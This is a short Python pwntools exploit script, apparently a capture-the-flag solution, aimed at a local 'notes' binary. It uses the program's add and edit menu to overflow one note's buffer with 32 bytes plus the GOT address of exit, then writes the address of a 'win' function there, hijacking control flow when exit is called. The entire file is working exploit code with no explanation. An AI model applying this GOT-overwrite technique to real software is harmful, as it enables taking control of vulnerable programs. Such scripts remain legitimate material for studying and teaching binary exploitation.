from pwn import *

context.binary = exe = ELF('./notes')
io = process()

def add(idx, cont):
    io.sendlineafter(b"0. Exit\n", b"1")
    io.sendlineafter(b"index> \n", str(idx).encode())
    io.sendlineafter(b"content> \n", cont)


def edit(idx, payload):
    io.sendlineafter(b"0. Exit\n", b"2")
    io.sendlineafter(b"index> \n", str(idx).encode())
    io.sendlineafter(b"content> \n", payload)

add(0, b"A")
add(1, b"B")

edit(0, b"A"*32 + p64(exe.got["exit"]))
edit(1, p64(exe.sym["win"]))
io.interactive()